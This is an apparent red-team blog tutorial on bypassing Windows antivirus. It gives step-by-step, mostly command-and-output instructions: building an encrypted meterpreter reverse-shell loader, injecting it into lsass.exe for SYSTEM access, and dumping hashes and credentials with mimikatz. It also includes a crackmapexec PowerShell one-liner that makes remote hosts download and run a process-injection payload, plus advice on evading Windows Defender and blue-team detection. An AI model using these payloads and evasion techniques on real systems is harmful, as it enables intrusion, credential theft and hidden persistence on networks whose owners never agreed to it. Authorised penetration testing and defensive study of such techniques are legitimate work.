---
layout: single
title:  "Pentesting Methodology - Antivirus Evasion"
date:   2021-02-08
excerpt: "r0kit's methodology for evading antivirus."
categories:
  - pentesting
  - infosec
tags:
  - antivirus evasion
  - red teaming
  - internal pentesting
---

## Bypassing Antivirus in 2021

### Before You Start

Disable automatic malware sample submission on your test machine.
Trust me, it will make your life easier if you make any mistakes trying to bypass AV software and get caught.
Before proceeding, you will need a Windows development machine with Visual Studio.

The tool we will be using will be [Alaris](https://github.com/cribdragg3r/Alaris) which leverages antivirus evasion techniques such as:

* Shellcode Encryption (AES-CBC 256)
* Direct x86 Syscalls (Does not use NtDLL.dll)
* Prevents 3rd party (non-Microsoft Signed) DLL’s from hooking or injecting both the parent and child processes.
* Parent Process ID spoofing
* Overwrites its own shellcode after execution.

Alaris's creator has written an excellent [blog post](https://sevrosecurity.com/2020/10/14/alaris-a-protective-loader/) on all the technical details for how this shellcode loader works and how to use it.

I will only be giving tips for how to operate such a tool during a pentest or red teaming engagement and what has worked best for me.

Build your shellcode. For example, you can try something like:

```
kali@kali:~/experiments/av-evasion$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.102 LPORT=2001 EXITFUNC=thread -f raw -o win64-2001-met.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Saved as: win64-2001-met.bin
```

Build `Cryptor.exe` if you haven't already.

![](/assets/images/av-evasion/build-cryptor.PNG)

Run that shellcode through `Cryptor.exe` to encrypt it.

```
PS C:\Users\r0kit.BUILDER\source\repos\Alaris> .\loader\x64\Release\cryptor.exe .\met.bin
[i] Replace shellcode string in loader with one below:

shellcode = "ZiWr29WwSWR4VhB10nV04Xk2KsA79O11sKrOEGRyBZZRkE3F7b7emEryP3Ya/sSWy0ujTivm90VfNq4CZUgQoGTAxQfv3CyhU38GZyC36xnivzgJmDjQIINxIIbzrQp+KLQubbHvbuF1KyEqwc3Dvt4sB0dkTKwRBifuayloX5ZjetkXvut5j7zXnsFu30iJ5JAcvO7Fy+2kjwJZXyomZgx2Y3QDZc0xavtn8REEX+gMBXSqmnd15A2WZTsQxrZzH/RcPl3RxJZxSeBh1OuS822WSix8s0BKnPLlfog9ZUUvaKva21GW5Ci+GiSS9gRkhGDyN3zUfWdK4yypP3og8h1cuubCsuQs9fxO3wcg9ka6BvN2bL28HVZEABUAknZ+kMDY0H7YiDg89LGvF+JvkGOGc6+fS7nz07BXBKJIRFjyNnEdAKlhaXXM49V8GC8aivICF/2HtFqOhPzIVbJSu97qL1LhRRKvmf96dLe+YWddu7ci5w/1hs02q9RecBnw/+RovTabZRqGkmEg+kKxwCAu8rkwd8CaV4NuSQCSxTXSgq6v2bAjarX5CGz6HBqXaQGkrs2cwifZjL/PVCG1j/kZelGD2+acKd2IaBycRtWL4TlIDA8wkOiDAWhJiDpEv3bi0ZfT4gfuc3sZZbe8dVn3GYAtTcXPiaPnPLlYAcs=";
```

Copy and paste the encrypted shellcode into the `shellcode` variable located in the `loader.cpp` file and rebuild the loader.

![](/assets/images/av-evasion/arm-loader-with-shellcode.PNG)

Now, execute `loader.exe` as the Administrator. It should connect back to your meterpreter handler.

```
kali@kali:~/experiments/av-evasion$ msfconsole -q -r meterpreter-handler.rc
[*] Processing meterpreter-handler.rc for ERB directives.
resource (meterpreter-handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (meterpreter-handler.rc)> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
resource (meterpreter-handler.rc)> set LHOST 192.168.2.102
LHOST => 192.168.2.102
resource (meterpreter-handler.rc)> set LPORT 2001
LPORT => 2001
resource (meterpreter-handler.rc)> set ExitOnSession false
ExitOnSession => false
resource (meterpreter-handler.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.2.102:2001
msf6 exploit(multi/handler) > [*] Sending stage (200262 bytes) to 192.168.2.28
[*] Meterpreter session 1 opened (192.168.2.102:2001 -> 192.168.2.28:50445) at 2021-02-17 10:42:29 -0500

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: BUILDER\r0kit
```

Let's try dumping the hashes.

```bash
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.
```

Looks like it did not work! Let's figure out why!

```
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 9892 created.
Channel 2 created.
Microsoft Windows [Version 10.0.18363.1379]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

Notice that when we drop into a shell, although we are part of the `Administrators` group, we are running with `Mandatory Label\Medium Mandatory Level` privileges indicating that UAC is enabled. Let's see why that is in depth.

```
meterpreter > getpid
Current pid: 10640
meterpreter > ps

Process List
============

 PID    PPID   Name                                 Arch  Session  User           Path
 ---    ----   ----                                 ----  -------  ----           ----
... CONTENT SNIPPED ...
 6400   6348   explorer.exe                         x64   1        BUILDER\r0kit  C:\Windows\explorer.exe
... CONTENT SNIPPED ...
 10640  6400   mobsync.exe                          x64   1
```

Notice how our child process `mobsync.exe` spawned from `explorer.exe` which was not running with high privileges. We can bypass UAC by injecting into a process running with SYSTEM privielges such as `lsass.exe` rather than `explorer.exe`. Note that this will only work if you run `loader.exe` with Administrator privileges!

Let's rebuild `loader.exe` to inject into `lsass.exe`.

![](/assets/images/av-evasion/rebuild-loader-inject-lsass.PNG)

Now, run the loader again with Administrator privielges. You should get another meterpreter connection.

```
msf6 exploit(multi/handler) >
[*] Sending stage (200262 bytes) to 192.168.2.28
[*] Meterpreter session 2 opened (192.168.2.102:2001 -> 192.168.2.28:50464) at 2021-02-17 11:04:51 -0500

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED
r0kit:1005:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

So this time, we were able to execute with SYSTEM privileges. Let's take a look at the processes to understand how the loader injected itself into it.

```
meterpreter > getpid
Current pid: 7744
meterpreter > ps

Process List
============

 PID    PPID   Name                                 Arch  Session  User                          Path
 ---    ----   ----                                 ----  -------  ----                          ----
... CONTENT SNIPPED ...
 804    632    lsass.exe                            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
... CONTENT SNIPPED ...
 7744   804    mobsync.exe                          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\mobsync.exe
```

Notice that since `lsass.exe` was running with SYSTEM privileges, we inherited those privileges by spawing as a child process of `lsass.exe`!
Skilled blue teams will notice that this behaviour is abnormal and may create signatures for `lsass.exe` spawning suspicious child processes like the hollowed `mobsync.exe` acting as a host for our meterperter shellcode.

### Additional Troubleshooting + Operational Stealth Tips

If the loader fails to inject into `lsass.exe`:

* You likely are not executing within a high privileged context and do not have permission to inject into that process. 
* AV is detecting a suspicious child processes spawned from `lsass.exe`. To work around this, you might also be able to find other processes running with SYTEM privileges to inject into, or bypass UAC by other means.

### Meterpreter C2

For this example, I used the following metasploit resource script to automatically handle multiple inbound C2 connection.
Very handy when you are in an enterprise environment and you have remote code execution on multiple machines.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_HOST
set LPORT YOUR_PORT
set ExitOnSession false
exploit -j
```

```bash
msfconsole -q -r TARGET_RC_FILE
```

## Older Technique

The technique below is an older technique that uses dynamic invokation to load encrypted shellcode.
Only fall back to this tecnnique as an alternative to the previous one mentioned in this blog post.

### Tools

* https://github.com/3xpl01tc0d3r/Obfuscator
* https://github.com/3xpl01tc0d3r/ProcessInjection

### Combining the Tools -> Meterpreter

Encrypt the meterpreter payload to increase stealthiness. With this technique, we can bypass windows defender via basic process injection techniques.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_HOST LPORT=YOUR_PORT EXITFUNC=thread --encrypt xor --encrypt-key '32_BYTE_KEY' -f raw -o pwn.raw
```

Download the shellcode and inject it into a process leveraging dynamic invocation process injection with the `/t:5` flag which adds an additional layer of stealth.
You can read more on [dynamic invocation here](https://thewover.github.io/Dynamic-Invoke/). In short, this allows us to invoke unmanaged code from memory or disk while avoiding API hooking and suspicious imports.

```powershell
ProcessInjection.exe /pid:TARGET_PID /url:"YOUR_HOST" /f:raw /enc:xor /t:5 /key:"32_BYTE_KEY"
```

### Gotchas

Please note that the technique above injects *raw shellcode* directly into the target process.
From experimenting, the best processes to inject into are those commonly ran on all operating systems.
Though, you need to be careful which process you inject into because if you inject into highly sensitive processes like `lsass.exe` or obvious ones like `svchost.exe`, windows defender will catch you.
My favorite process to migrate to is `explorer.exe` because it is one of those processes that is normally ran in user-mode, always running on client workstations and windows defender is more lax on monitoring that process. If might even be worthwhile doing some recon on compromised targets to see which processes are available and inject into.

On this note, if you happen to be an admin, it is safe to manually migrate via meterpreter to processes running as SYSTEM without getting caught by windows defender by running the meterpreter `migrate` command. DO NOT USE THE `windows/manage/migrate` MSF module OR the `getsystem` from meterpreter. You will likely get caught and you have been warned!

The tools are flexible enough to accept multiple formats of shellcode such as base64, c, and hex to help evade anti-virus.

### More on Obfuscator

Note that in the examples above, we used XOR rather than AES256 to encrypt our meterpreter payload.
This is likely because the ProcessInjector tool has a specific way of calculating the IV. If you wish to use AES256 encryption for encrypting your shellcode, I recommend running Obfuscator over a base64-encoded raw meterpreter payload which is the companion tool to ProcessInjector. This way, the encryption will be prepared in the way the ProcessInjector tool expects it to be. The downside of this is that this takes a little more time to prepare as you will need to prepare the encryption on a Windows malware building machine.

At this point, we need the compromised victim hosts to download and execute our process injection loader. My tool of choice for mass remote code execution on Windows enterprise networks is `crackmapexec`. Crackmapexec has a feature allowing pentesters to execute arbitrary PowerShell commands on remote hosts by uploading a stager via an SMB pipe. Unfortunately in harderned networks we cannot use this since Windows Defender will stop the stager from executing and alert victims of our presence. The command below is preferred:

```bash
sudo crackmapexec smb HOST -u USER -p 'PASSWORD' -x 'powershell "(New-Object Net.WebClient).DownloadFile(\"HTTP_PATH_TO_YOUR_FILE\",\"C:\Windows\TEMP\ProcessInjection.exe\"); $pwn = ps | ? {$_.ProcessName -like \"*explorer*\"} | Select-Object -first 1; C:\Windows\TEMP\ProcessInjection.exe /pid:$($pwn.Id) /url:\"HTTP_PATH_TO_YOUR_METERPRETER\" /f:raw /t:5; rm C:\Windows\TEMP\ProcessInjection.exe"'
```

## Post Exploitation

### Credential Gathering

Once you have a bunch of sessions, you may want to dump credentials and reuse them to enable lateral movement.

```
load mimikatz
kiwi_cmd logon::debug
kiwi_cmd sekurlsa::logonpasswords
```

### Firewall Evasion

Additionally, you may want to port forward with meterpreter as well to go deeper in the networks.

Quite often, environments may have hardened firewalls whitelisting common ports like TCP 53, 443, and 80. If you need to host malware on those ports but have ran out, it helps to have a few virtual machines kicking around so that you can host the malware on those instead to call back to your C2 server.
